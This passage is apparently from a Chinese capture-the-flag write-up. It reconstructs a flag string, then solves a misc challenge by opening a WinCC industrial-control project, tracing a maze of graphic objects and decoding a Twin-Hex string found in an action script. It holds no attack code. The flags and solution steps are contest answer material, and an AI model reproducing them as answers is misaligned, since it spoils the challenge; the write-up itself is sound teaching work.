# flag{m0mmarjvu6d7xfdigyhbftr1kxd4qudt} ->1
# iGyHbFTR1kxAAAAAt}
# flag{m0MmARJVu6d7XfdAAAEbFTRBAxD4qUDt} ->2
# iGyHbFTR1kxD4qUDt} ->3
# flag{m0MmARJVu6d7XfdiGyHbFTR1kxD4qUDt} 1、2、3综合一下

```

0x05 Misc
=========

Welcome
-------

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9ad3211ae58263235f5cf122589707e811d83d77.png)

Black sheep wall
----------------

1.根据附件格式，上网搜索，发现需要wincc打开

软件下载地址

<https://pan.quark.cn/s/6c4799cbf8a1#/list/share>

软件安装教程

<https://www.bilibili.com/read/cv17284858>

软件非常大，安装特别慢，严格对照教程安装完毕后，在打开项目的时候，把项目中的计算机名修改为自己的计算机名，可正常打开。

2.打开后发现线索1

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-d89f4670799c4f93ace696aff2860df8eb545d5d.png)

3.在工程中图形编辑器，可发现其它线索，并发现一个简单的迷宫，及提示。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a2f89f789fb33bb6650f452890be90d6000720aa.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-15644db247c9cfa490d768bba18f02e05e157be0.png)

4.根据底下的提示文本，并对照迷宫图，可知自己所处位置为图形对象22，目的地址为图形对象4

走出迷宫为22-13-4或者是根据提示要带上线索，22-13-4-1-2-1-4

keyword是double，hex ，在工控中为浮点数转hex，但是答案怎么试都不对，感觉就差一步了。

出口的动态也和其它方块不一样

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7845348e30084e559fd9cb88ab5f92921e15e2d0.png)

找到动作1的脚本

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ed24b61df2dd4ede793fee6bae5c181b1b3c2e49.png)

双hex编码

[Twin-Hex Cypher encoder and decoder from CalcResult Universal Calculators](https://www.calcresult.com/misc/cyphers/twin-hex.html)

58s4vb6sj51z4zd1n81cd4tt1ci10l4wj1hp50i1lx10l1v519w4wm58l1sn4yl

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-aab7b417d6d1af39c51d6fbf6c65f7e235766abb.png)